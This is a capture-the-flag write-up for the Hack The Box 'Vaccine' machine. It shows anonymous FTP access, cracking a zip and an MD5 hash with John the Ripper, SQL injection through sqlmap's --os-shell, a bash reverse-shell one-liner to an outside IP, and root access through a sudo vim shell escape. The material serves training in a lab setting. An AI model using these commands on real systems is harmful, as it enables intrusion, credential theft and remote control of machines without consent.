HTB - Vaccine

Operating System: Linux
Tags: FTP, Apache, John The Ripper,
PostgreSQL, Vim

Information Gathering

First I started with a basic Nmap scan to identify open ports and services. This scan revealed FTP, SSH, and an Apache webserver all actively running. I noticed that FTP had anonymous login enabled, so I checked that out first.

$ nmap -sV -sC 10.129.183.17

Vulnerability Assessment

Using anonymous login, I discovered a backup.zip file which was encrypted.

$ ftp 10.129.183.17
ftp> get backup.zip


To crack the zip file I used zip2john to create the hash, and then used john with the rockyou.txt wordlist. This revealed the password "741852963" to access the zip.

$ zip2john backup.zip > zip.hash
$ john --wordlist=../Wordlists/rockyou.txt zip.hash

Exploitation

Now with a working password, I opened the zip and viewed the index.php file. The contents contained a md5 hash for the administrator's password that I could use for the Apache webserver.

$ cat index.php

After putting the hash into a text file, I once again used John to crack this hash with rockyou.txt and found the admin password was qwerty789.

$ echo -n "2cb42f8734ea607eefed3b70af13bbd3" > admin.hash
$ john --format=raw-md5 --wordlist=../Wordlists/rockyou.txt admin.hash

I then traveled to the Apache webpage and logged in as the admin to find a database on the dashboard. Immediately I thought of SQLi as a potential vulnerability, so I tested the search bar parameter with a single quote.


A single quote produced an error, which proved likely that SQLi was possible. I loaded up Burp Suite to capture the search request, and forwarded that to sqlmap. 

$ sqlmap -r sql.req --batch --os-shell

Sqlmap did find a vulnerability, which converted into a shell with the --os-shell flag. After confirming I had command injection, I set up netcat to create a reverse shell to my machine. With some quick searching, I found the user flag.

os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.65/9001 0>&1'


Post-Exploitation

While using my netcat shell I was constantly being disconnected. This led me to finding some credentials located in the dashboard.php file I could use to SSH into the box.

$ cat dashboard.php

Now with a consistent connection, I began looking for ways to escalate my privileges. I started with sudo -l and found this user has sudo privelges on a file named pg_hba.conf using vim.

Once in the file, I used : to enter command mode and typed !bash to create a shell session. This gave me a root shell and allowed me to find the final flag.

$ sudo vi /etc/postgresql/11/main/pg_hba.conf
